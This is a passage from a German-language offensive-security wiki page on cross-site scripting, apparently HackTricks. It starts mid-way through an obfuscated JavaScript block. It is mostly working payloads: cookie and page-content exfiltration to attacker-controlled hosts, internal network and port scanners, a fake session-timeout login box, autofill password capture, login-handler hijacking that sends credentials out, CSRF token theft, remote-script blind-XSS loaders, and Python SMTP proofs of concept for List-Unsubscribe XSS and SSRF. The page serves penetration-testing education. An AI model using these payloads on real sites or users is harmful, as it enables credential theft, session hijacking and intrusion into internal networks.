ﾟωﾟﾉ = /｀ｍ´）ﾉ ~┻━┻   / /*´∇｀*/["_"]
o = ﾟｰﾟ = _ = 3
c = ﾟΘﾟ = ﾟｰﾟ - ﾟｰﾟ
ﾟДﾟ = ﾟΘﾟ = (o ^ _ ^ o) / (o ^ _ ^ o)
ﾟДﾟ = {
ﾟΘﾟ: "_",
ﾟωﾟﾉ: ((ﾟωﾟﾉ == 3) + "_")[ﾟΘﾟ],
ﾟｰﾟﾉ: (ﾟωﾟﾉ + "_")[o ^ _ ^ (o - ﾟΘﾟ)],
ﾟДﾟﾉ: ((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ],
}
ﾟДﾟ[ﾟΘﾟ] = ((ﾟωﾟﾉ == 3) + "_")[c ^ _ ^ o]
ﾟДﾟ["c"] = (ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ - ﾟΘﾟ]
ﾟДﾟ["o"] = (ﾟДﾟ + "_")[ﾟΘﾟ]
ﾟoﾟ =
ﾟДﾟ["c"] +
ﾟДﾟ["o"] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ] +
((ﾟωﾟﾉ == 3) + "_")[ﾟｰﾟ] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
((ﾟｰﾟ == 3) + "_")[ﾟｰﾟ - ﾟΘﾟ] +
ﾟДﾟ["c"] +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
ﾟДﾟ["o"] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ]
ﾟДﾟ["_"] = (o ^ _ ^ o)[ﾟoﾟ][ﾟoﾟ]
ﾟεﾟ =
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
ﾟДﾟ.ﾟДﾟﾉ +
(ﾟДﾟ + "_")[ﾟｰﾟ + ﾟｰﾟ] +
((ﾟｰﾟ == 3) + "_")[o ^ _ ^ (o - ﾟΘﾟ)] +
((ﾟｰﾟ == 3) + "_")[ﾟΘﾟ] +
(ﾟωﾟﾉ + "_")[ﾟΘﾟ]
ﾟｰﾟ += ﾟΘﾟ
ﾟДﾟ[ﾟεﾟ] = "\\"
ﾟДﾟ.ﾟΘﾟﾉ = (ﾟДﾟ + ﾟｰﾟ)[o ^ _ ^ (o - ﾟΘﾟ)]
oﾟｰﾟo = (ﾟωﾟﾉ + "_")[c ^ _ ^ o]
ﾟДﾟ[ﾟoﾟ] = '"'
ﾟДﾟ["_"](
ﾟДﾟ["_"](
ﾟεﾟ +
ﾟДﾟ[ﾟoﾟ] +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
(ﾟｰﾟ + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
ﾟｰﾟ +
(o ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
(c ^ _ ^ o) +
ﾟДﾟ[ﾟεﾟ] +
ﾟΘﾟ +
((o ^ _ ^ o) + (o ^ _ ^ o)) +
ﾟｰﾟ +
ﾟДﾟ[ﾟεﾟ] +
ﾟｰﾟ +
((o ^ _ ^ o) - ﾟΘﾟ) +
ﾟДﾟ[ﾟεﾟ] +
(ﾟｰﾟ + ﾟΘﾟ) +
ﾟΘﾟ +
ﾟДﾟ[ﾟoﾟ]
)(ﾟΘﾟ)
)("_")
```

```javascript
// It's also possible to execute JS code only with the chars: []`+!${}
```
## XSS - häufige payloads

### Mehrere payloads in 1


{{#ref}}
steal-info-js.md
{{#endref}}

### Iframe Trap

Lässt den Benutzer auf der Seite navigieren, ohne das iframe zu verlassen, und stiehlt seine Aktionen (einschließlich Informationen, die in forms gesendet werden):


{{#ref}}
../iframe-traps.md
{{#endref}}

### Cookies abrufen
```javascript
<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
```
> [!TIP]
> Du **wirst nicht in der Lage sein, auf die cookies von JavaScript zuzugreifen**, wenn das HTTPOnly flag im cookie gesetzt ist. Aber hier hast du [einige Wege, diesen Schutz zu umgehen](../hacking-with-cookies/index.html#httponly), falls du genug Glück hast.

### Seiteninhalt stehlen
```javascript
var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8"
var attacker = "http://10.10.14.8/exfil"
var xhr = new XMLHttpRequest()
xhr.onreadystatechange = function () {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
}
}
xhr.open("GET", url, true)
xhr.send(null)
```
### Interne IPs finden
```html
<script>
var q = []
var collaboratorURL =
"http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net"
var wait = 2000
var n_threads = 51

// Prepare the fetchUrl functions to access all the possible
for (i = 1; i <= 255; i++) {
q.push(
(function (url) {
return function () {
fetchUrl(url, wait)
}
})("http://192.168.0." + i + ":8080")
)
}

// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
for (i = 1; i <= n_threads; i++) {
if (q.length) q.shift()()
}

function fetchUrl(url, wait) {
console.log(url)
var controller = new AbortController(),
signal = controller.signal
fetch(url, { signal })
.then((r) =>
r.text().then((text) => {
location =
collaboratorURL +
"?ip=" +
url.replace(/^http:\/\//, "") +
"&code=" +
encodeURIComponent(text) +
"&" +
Date.now()
})
)
.catch((e) => {
if (!String(e).includes("The user aborted a request") && q.length) {
q.shift()()
}
})

setTimeout((x) => {
controller.abort()
if (q.length) {
q.shift()()
}
}, wait)
}
</script>
```
### Port Scanner (fetch)
```javascript
const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
```
### Port Scanner (websockets)
```python
var ports = [80, 443, 445, 554, 3306, 3690, 1234];
for(var i=0; i<ports.length; i++) {
var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
s.start = performance.now();
s.port = ports[i];
s.onerror = function() {
console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
};
s.onopen = function() {
console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
};
}
```
_Kurze Zeiten deuten auf einen antwortenden Port hin_ _Längere Zeiten deuten auf keine Antwort hin._

Überprüfe die Liste der in Chrome gesperrten Ports [**here**](https://src.chromium.org/viewvc/chrome/trunk/src/net/base/net_util.cc) und in Firefox [**here**](https://www-archive.mozilla.org/projects/netlib/portbanning#portlist).

### Box zum Abfragen von credentials
```html
<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
```
### Auto-Fill-Passwörter abfangen
```javascript
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
Wenn Daten in das password field eingefügt werden, werden username und password an den attackers server gesendet; selbst wenn der Client ein gespeichertes Passwort auswählt und nichts eingibt, werden die credentials exfiltriert.

### Hijack form handlers to exfiltrate credentials (const shadowing)

Wenn ein critical handler (z. B. `function DoLogin(){...}`) später auf der Seite deklariert wird und dein payload früher ausgeführt wird (z. B. via einem inline JS-in-JS sink), definiere zuerst ein `const` mit demselben Namen, um den handler vorwegzunehmen und zu sperren. Spätere function declarations können einen `const`-Namen nicht neu binden, wodurch dein hook die Kontrolle behält:
```javascript
const DoLogin = () => {
const pwd  = Trim(FormInput.InputPassword.value);
const user = Trim(FormInput.InputUtente.value);
fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));
};
```
Hinweise
- Dies beruht auf der Ausführungsreihenfolge: deine Injection muss vor der legitimen Deklaration ausgeführt werden.
- Wenn dein Payload in `eval(...)` eingeschlossen ist, werden `const/let`-Bindings nicht zu globalen Variablen. Verwende die dynamische `<script>`-Injection-Technik aus dem Abschnitt “Deliverable payloads with eval(atob()) and scope nuances”, um eine echte globale, nicht-überschreibbare Bindung sicherzustellen.
- Wenn Keyword-Filter Code blockieren, kombiniere dies mit Unicode-escaped identifiers oder der `eval(atob('...'))`-Auslieferung, wie oben gezeigt.

### Keylogger

Bei einer Suche in github habe ich ein paar verschiedene gefunden:

- [https://github.com/JohnHoder/Javascript-Keylogger](https://github.com/JohnHoder/Javascript-Keylogger)
- [https://github.com/rajeshmajumdar/keylogger](https://github.com/rajeshmajumdar/keylogger)
- [https://github.com/hakanonymos/JavascriptKeylogger](https://github.com/hakanonymos/JavascriptKeylogger)
- Du kannst auch metasploit `http_javascript_keylogger` verwenden

### Stealing CSRF tokens
```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/email',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/email/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
### Stehlen von PostMessage-Nachrichten
```html
<img src="https://attacker.com/?" id=message>
<script>
window.onmessage = function(e){
document.getElementById("message").src += "&"+e.data;
</script>
```
### PostMessage-origin script loaders (opener-gated)

Wenn eine Seite **`event.origin` aus einer `postMessage` speichert und es später in eine Script-URL einfügt**, kontrolliert der Sender die **Origin** des geladenen JS:
```javascript
window.addEventListener('message', (event) => {
if (event.data.msg_type === 'IWL_BOOTSTRAP') {
localStorage.setItem('CFG', {host: event.origin, pixelID: event.data.pixel_id});
startIWL(); // later loads `${host}/sdk/${pixelID}/iwl.js`
}
});
```
Exploitation recipe (from CAPIG):

- **Gates**: wird nur ausgelöst, wenn `window.opener` existiert und `pixel_id` allowlisted ist; **origin is never checked**.
- **Use CSP-allowed origin**: pivot zu einer Domain, die bereits von der Opfer-CSP erlaubt ist (z. B. ausgeloggte Hilfeseiten, die Analytics wie `*.THIRD-PARTY.com` erlauben) und hoste dort `/sdk/<pixel_id>/iwl.js` via takeover/XSS/upload.
- **Restore `opener`**: in Android WebView macht `window.name='x'; window.open(target,'x')` die Seite zum eigenen opener; sende die bösartige `postMessage` aus einem kompromittierten iframe.
- **Trigger**: das iframe postet `{msg_type:'IWL_BOOTSTRAP', pixel_id:<allowed>}`; die übergeordnete Seite lädt dann die Angreifer-`iwl.js` von der CSP-allowed Origin und führt sie aus.

Das verwandelt origin-lose `postMessage`-Validierung in ein **remote script loader primitive**, das CSP überlebt, wenn du auf irgendeiner Origin landen kannst, die bereits von der Policy erlaubt ist.

### Supply-chain stored XSS via backend JS concatenation

Wenn ein Backend **ein gemeinsames SDK aufbaut, indem es JS-Strings mit benutzerkontrollierten Werten konkatenert**, kann jeder Quote-/Struktur-Breaker Script injizieren, das an jeden Consumer ausgeliefert wird:

- Example pattern (Meta CAPIG): server appends `cbq.config.set("<pixel>","IWLParameters",{params: <user JSON>});` directly into `capig-events.js`.
- Das Injizieren von `'` oder `"]}` schließt das Literal/Objekt und fügt Angreifer-JS hinzu, wodurch **stored XSS** im verteilten SDK für jede Seite entsteht, die es lädt (first-party and third-party).

### Stored XSS in generated reports when escaping is disabled

Wenn hochgeladene Dateien geparst werden und deren Metadaten in HTML-Reports mit deaktiviertem Escaping (`|safe`, custom renderers) ausgegeben werden, sind diese Metadaten ein **stored XSS sink**. Beispielablauf:
```python
xmlhost = data.getAttribute(f'{ns}:host')
ret_list.append(('dialer_code_found', (xmlhost,), ()))
'title': a_template['title'] % t_name  # %s fed by xmlhost
```
Ein Django-Template rendert `{{item|key:"title"|safe}}`, wodurch attacker HTML ausgeführt wird.

**Exploit:** place **entity-encoded HTML** in any manifest/config field that reaches the report:
```xml
<data android:scheme="android_secret_code"
android:host="&lt;img src=x onerror=alert(document.domain)&gt;"/>
```
Gerendert mit `|safe` gibt der Bericht `<img ...>` aus und führt beim Anzeigen JS aus.

**Hunting:** Suche nach report/notification builders, die geparste Felder in `%s`/f-strings wiederverwenden und auto-escape deaktivieren. Ein kodiertes Tag in einem hochgeladenen Manifest/Log/Archiv führt zu persistentem XSS für jeden Betrachter.

### Missbrauch von Service Workers


{{#ref}}
abusing-service-workers.md
{{#endref}}

### Zugriff auf Shadow DOM


{{#ref}}
shadow-dom.md
{{#endref}}

### Polyglots


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
{{#endref}}

### Blind XSS payloads

Du kannst auch verwenden: [https://xsshunter.com/](https://xsshunter.com)
```html
"><img src='//domain/xss'>
"><script src="//domain/xss.js"></script>
><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>

<!-- html5sec - Self-executing focus event via autofocus: -->
"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>

<!-- html5sec - JavaScript execution via iframe and onload -->
"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')">

<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>

<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">

<!-- xsshunter.com - Sites that use JQuery -->
<script>$.getScript("//domain")</script>

<!-- xsshunter.com - When <script> is filtered -->
"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>

<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>

<!-- noscript trick -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- whitelisted CDNs in CSP -->
"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>

<!-- Payloads from https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide -->
<!-- Image tag -->
'"><img src="x" onerror="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- Input tag with autofocus -->
'"><input autofocus onfocus="eval(atob(this.id))" id="Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw==">

<!-- In case jQuery is loaded, we can make use of the getScript method -->
'"><script>$.getScript("{SERVER}/script.js")</script>

<!-- Make use of the JavaScript protocol (applicable in cases where your input lands into the "href" attribute or a specific DOM sink) -->
javascript:eval(atob("Y29uc3QgeD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTt4LnNyYz0ne1NFUlZFUn0vc2NyaXB0LmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHgpOw=="))

<!-- Render an iframe to validate your injection point and receive a callback -->
'"><iframe src="{SERVER}"></iframe>

<!-- Bypass certain Content Security Policy (CSP) restrictions with a base tag -->
<base href="{SERVER}" />

<!-- Make use of the meta-tag to initiate a redirect -->
<meta http-equiv="refresh" content="0; url={SERVER}" />

<!-- In case your target makes use of AngularJS -->
{{constructor.constructor("import('{SERVER}/script.js')")()}}
```
### Regex - Zugriff auf versteckte Inhalte

Aus [**this writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-piyosay) lässt sich lernen, dass selbst wenn einige Werte im JS verschwinden, sie weiterhin in JS-Attributen verschiedener Objekte gefunden werden können. Zum Beispiel lässt sich eine Eingabe eines REGEX weiterhin finden, nachdem der Wert der Eingabe des REGEX entfernt wurde:
```javascript
// Do regex with flag
flag = "CTF{FLAG}"
re = /./g
re.test(flag)

// Remove flag value, nobody will be able to get it, right?
flag = ""

// Access previous regex input
console.log(RegExp.input)
console.log(RegExp.rightContext)
console.log(
document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"]
)
```
### Brute-Force Liste


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt
{{#endref}}

## XSS Ausnutzen anderer Schwachstellen

### XSS in Markdown

Kann man Markdown-Code injizieren, der gerendert wird? Vielleicht kannst du dadurch XSS bekommen! Sieh dir an:


{{#ref}}
xss-in-markdown.md
{{#endref}}

### XSS zu SSRF

Hast du XSS auf einer **Website, die Caching verwendet**? Versuche, das **in SSRF umzuwandeln** durch Edge Side Include Injection mit diesem Payload:
```python
<esi:include src="http://yoursite.com/capture" />
```
Verwende es, um Cookie-Einschränkungen, XSS-Filter und vieles mehr zu umgehen!\
Mehr Informationen zu dieser Technik hier: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS in dynamisch erstelltem PDF

Wenn eine Webseite ein PDF unter Verwendung nutzerkontrollierter Eingaben erstellt, kannst du versuchen, den **Bot auszutricksen**, der das PDF erzeugt, sodass er **beliebigen JS-Code ausführt**.\
Wenn der **PDF-Erstellungs-Bot** also irgendeine Art von **HTML** **tags** findet, wird er diese **interpretieren**, und du kannst dieses Verhalten **missbrauchen**, um ein **Server XSS** zu verursachen.


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}

Wenn du keine HTML tags injizieren kannst, kann es sich lohnen, stattdessen **PDF-Daten zu injizieren**:


{{#ref}}
pdf-injection.md
{{#endref}}

### XSS in Amp4Email

AMP, das darauf abzielt, die Performance von Webseiten auf mobilen Geräten zu beschleunigen, verwendet HTML-Tags ergänzt durch JavaScript, um Funktionalität mit Schwerpunkt auf Geschwindigkeit und Sicherheit zu gewährleisten. Es unterstützt eine Reihe von Komponenten für verschiedene Funktionen, zugänglich über [AMP components](https://amp.dev/documentation/components/?format=websites).

Das [**AMP for Email**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/)-Format erweitert bestimmte AMP-Komponenten für E-Mails und ermöglicht Empfängern, direkt innerhalb ihrer E-Mails mit Inhalten zu interagieren.

Example [**writeup XSS in Amp4Email in Gmail**](https://adico.me/post/xss-in-gmail-s-amp4email).

### List-Unsubscribe Header Abuse (Webmail XSS & SSRF)

Der RFC 2369 `List-Unsubscribe`-Header bettet von Angreifern kontrollierte URIs ein, die viele Webmail- und Mail-Clients automatisch in "Unsubscribe"-Buttons umwandeln. Wenn diese URIs ohne Validierung gerendert oder abgerufen werden, wird der Header zu einem Injektionspunkt für sowohl stored XSS (wenn der Unsubscribe-Link im DOM platziert wird) als auch SSRF (wenn der Server die Unsubscribe-Anfrage im Namen des Benutzers ausführt).

#### Stored XSS via `javascript:` URIs

1. **Sende dir selbst eine E-Mail**, in der der Header auf eine `javascript:`-URI zeigt, während der Rest der Nachricht harmlos bleibt, damit Spamfilter sie nicht blockieren.
2. **Stelle sicher, dass die UI den Wert rendert** (viele Clients zeigen ihn in einem "List Info"-Bereich) und überprüfe, ob das resultierende `<a>`-Tag angreiferkontrollierte Attribute wie `href` oder `target` übernimmt.
3. **Löse die Ausführung aus** (z. B. STRG+Klick, Mittelklick oder "in neuem Tab öffnen"), wenn der Link `target="_blank"` verwendet; Browser evaluieren das übergebene JavaScript im Origin der Webmail-Anwendung.
4. Beobachte die Stored-XSS-Primitive: die Nutzlast bleibt mit der E-Mail erhalten und erfordert nur einen Klick zur Ausführung.
```text
List-Unsubscribe: <javascript://attacker.tld/%0aconfirm(document.domain)>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
Das Newline-Byte (`%0a`) in der URI zeigt, dass selbst ungewöhnliche Zeichen die Rendering-Pipeline in verwundbaren Clients wie Horde IMP H5 überleben, die die Zeichenfolge wörtlich innerhalb des anchor-Tags ausgeben.

<details>
<summary>Minimaler SMTP PoC, der einen bösartigen List-Unsubscribe header liefert</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
sender = "list@example.org"
recipient = "victim@example.org"

msg = EmailMessage()
msg.set_content("Testing List-Unsubscribe rendering")
msg["From"] = sender
msg["To"] = recipient
msg["Subject"] = "Newsletter"
msg["List-Unsubscribe"] = "<javascript://evil.tld/%0aconfirm(document.domain)>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

#### Server-side unsubscribe proxies -> SSRF

Einige Clients, wie z. B. die Nextcloud Mail app, proxyen die Unsubscribe-Aktion serverseitig: Ein Klick auf den Button veranlasst den Server, die angegebene URL selbst abzurufen. Dadurch wird der Header zu einem SSRF-Primitiv, besonders wenn Administratoren `'allow_local_remote_servers' => true` setzen (dokumentiert in [HackerOne report 2902856](https://hackerone.com/reports/2902856)), was Anfragen an Loopback- und RFC1918-Bereiche erlaubt.

1. **Erstelle eine E-Mail** in der `List-Unsubscribe` auf einen vom Angreifer kontrollierten Endpunkt zeigt (für blindes SSRF Burp Collaborator / OAST verwenden).
2. **Behalte `List-Unsubscribe-Post: List-Unsubscribe=One-Click` bei** damit die UI einen Ein-Klick-Unsubscribe-Button anzeigt.
3. **Erfülle Vertrauensanforderungen**: Nextcloud führt z. B. HTTPS-Unsubscribe-Anfragen nur durch, wenn die Nachricht den DKIM-Check besteht, daher muss der Angreifer die E-Mail mit einer Domain signieren, die er kontrolliert.
4. Zustelle die Nachricht an ein vom Zielserver verarbeites Postfach und warte, bis ein Benutzer auf den Unsubscribe-Button klickt.
5. Beobachte den serverseitigen Callback am Collaborator-Endpunkt und pivot anschließend zu internen Adressen, sobald das Primitiv bestätigt ist.
```text
List-Unsubscribe: <http://abcdef.oastify.com>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
```
<details>
<summary>DKIM-signierte List-Unsubscribe-Nachricht für SSRF-Tests</summary>
```python
#!/usr/bin/env python3
import smtplib
from email.message import EmailMessage
import dkim

smtp_server = "mail.example.org"
smtp_port = 587
smtp_user = "user@example.org"
smtp_password = "REDACTED"
dkim_selector = "default"
dkim_domain = "example.org"
dkim_private_key = """-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"""

msg = EmailMessage()
msg.set_content("One-click unsubscribe test")
msg["From"] = "list@example.org"
msg["To"] = "victim@example.org"
msg["Subject"] = "Mailing list"
msg["List-Unsubscribe"] = "<http://abcdef.oastify.com>"
msg["List-Unsubscribe-Post"] = "List-Unsubscribe=One-Click"

raw = msg.as_bytes()
signature = dkim.sign(
message=raw,
selector=dkim_selector.encode(),
domain=dkim_domain.encode(),
privkey=dkim_private_key.encode(),
include_headers=["From", "To", "Subject"]
)
msg["DKIM-Signature"] = signature.decode().split(": ", 1)[1].replace("\r", "").replace("\n", "")

with smtplib.SMTP(smtp_server, smtp_port) as smtp:
smtp.starttls()
smtp.login(smtp_user, smtp_password)
smtp.send_message(msg)
```
</details>

**Testhinweise**

- Verwende einen OAST-Endpoint, um blind SSRF-Treffer zu sammeln, und passe dann die `List-Unsubscribe`-URL an, um nach Bestätigung des Primitives `http://127.0.0.1:PORT`, Metadata-Services oder andere interne Hosts anzusprechen.
- Da der unsubscribe helper oft denselben HTTP-Stack wie die Anwendung wiederverwendet, erbst du dessen Proxy-Einstellungen, HTTP-Verben und Header-Rewrites, was weitere Traversal-Tricks ermöglicht, die in der [SSRF methodology](../ssrf-server-side-request-forgery/README.md) beschrieben sind.

### XSS: Dateien hochladen (svg)

